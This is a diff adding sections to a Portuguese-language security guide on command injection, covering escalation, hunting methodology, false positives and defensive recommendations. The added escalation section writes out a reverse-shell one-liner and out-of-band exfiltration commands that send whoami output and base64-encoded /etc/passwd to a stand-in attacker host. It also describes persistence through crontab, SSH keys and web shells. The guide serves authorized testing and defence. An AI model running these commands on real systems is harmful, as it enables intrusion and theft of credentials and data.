@@ -116,6 +116,27 @@ Casos reais e mentalidade de ataque (RWBH): Yahoo e Uber (ferramentas de diagnó
 - **Paths comuns:** `/api/ping`, `/api/dns`, `/api/tools`, `/api/convert`, `/api/export`, `/api/backup`, `/admin/system`, `/diagnostics`, `/webhook`.
 - **Sinais:** funcionalidades de ping/DNS/WHOIS; conversão de mídia; backup; erros com saída de shell; atraso com `sleep`; resposta com `uid=`.
 
+## Escalation Techniques
+- **RCE direto:** qualquer command injection e RCE -- `id`, `whoami`, reverse shell (`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`).
+- **Exfiltracao OOB:** quando a saida nao e refletida, usar `curl http://attacker.com/$(whoami)` ou DNS (`nslookup $(cat /etc/passwd | base64).attacker.com`).
+- **Persistence:** escrever crontab, SSH authorized_keys ou web shell para manter acesso.
+- **Lateral movement:** usar credenciais do servidor (env vars, config files) para pivotar para banco, cloud e outros servicos.
+- **Container escape:** se a app roda em container, verificar se ha montagens privilegiadas ou `--privileged` para escapar para o host.
+
+## Hunting Methodology
+1. Identificar funcionalidades que interagem com o OS: ping, DNS lookup, conversao de arquivos, backup, diagnosticos, webhook.
+2. Injetar metacaracteres de shell: `;`, `|`, `||`, `&&`, `` ` ``, `$(...)`, `\n`, `%0a`.
+3. Para blind injection: usar `sleep 5` e medir tempo de resposta; ou usar OOB com dominio controlado.
+4. Testar argument injection: se o input e passado como argumento (nao como parte do comando), tentar `--help`, `-v`, ou opcoes que alterem comportamento.
+5. Testar variacoes de encoding: URL encoding, double encoding, unicode, `$IFS` como separador.
+6. Verificar se a aplicacao usa shell wrapper (`/bin/sh -c`) ou execucao direta -- shell wrapper amplia vetores.
+
+## False Positive Indicators
+- Aplicacao retorna erro ao receber metacaracteres mas nao executa o comando -- sanitizacao funciona.
+- Timeout no response nao e causado por `sleep` mas por carga/rede -- repetir e comparar com baseline.
+- OOB request recebido mas de IP diferente do servidor alvo -- pode ser scanner ou bot, nao a aplicacao.
+- Funcionalidade usa API nativa (ex.: `InetAddress.getByName()`) e nao shell -- nao e command injection mesmo com input refletido em erro.
+
 ## Recommendation
 1. Evitar shell: usar APIs nativas (`InetAddress`, bibliotecas de DNS, parsing de imagem) em vez de comandos.
 2. Se for inevitável, usar `ProcessBuilder` com lista de argumentos e **não** `shell=True`/`Runtime.exec(String)`; validar cada argumento.
@@ -135,3 +156,4 @@ import subprocess, shlex
 subprocess.run(["ping", "-c", "1", validated_host], shell=False, timeout=5, check=True)
 ```
 9. Testar com payloads de separadores e OOB em ambiente autorizado.
+
